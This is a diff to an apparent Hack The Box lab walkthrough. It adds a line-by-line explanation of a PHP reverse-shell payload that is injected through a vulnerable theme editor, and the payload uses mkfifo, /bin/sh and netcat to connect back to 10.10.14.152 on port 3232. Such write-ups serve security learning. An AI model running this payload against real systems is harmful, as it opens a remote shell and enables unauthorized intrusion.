@@ -89,7 +89,9 @@ According to the CVE I found the *theme-edit.php* file has poor input sanitizati
 
 `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.152 3232 >/tmp/f"); ?>`
 
+Breaking that payload down a little bit:
 
+`<?php?>` is the *php* tag, `system` is a built-in *php* function that is used to execute system commands. `rm /tmp/f` Removes the named pip */tmp/f* if it already exists, `mkfifo /tmp/f` creates a *FIFO (first in first out)* file which is also known as a named pipe. The file is named *f* and placed in the */tmp* directory, it is a special file type that is used for inter-process communication, it acts as a pipeline that allows one process to write to the pipe and another process to read from it. These named pipes do not store any data, they only server to pass data between processes. `cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.152 3232 >/tmp/f` pipes the output of */tmp/f* to netcat, which sends it to my ip address on the port I will set up the listener on. The `/bin/sh -i` part starts an interactive shell with input/output connected to the named pipe, `2>&1` redirects standard error to standard output, this means that error messages will also be sent to the remote host. Finally, `>/tmp/f` redirects the output of the *netcat* command back to the named pipe, so the reverse shell can read it.
 
 ![Theme Editor](/docs/assets/images/HTB/gettingstarted/gettingstarted17.png)
 
@@ -102,5 +104,9 @@ After that I will set up a listener in a new terminal then navigate over to the 
 ![filepath](/docs/assets/images/HTB/gettingstarted/gettingstarted20.png)
 
 ![execute shell](/docs/assets/images/HTB/gettingstarted/gettingstarted21.png)
+
+
+
+
 
 
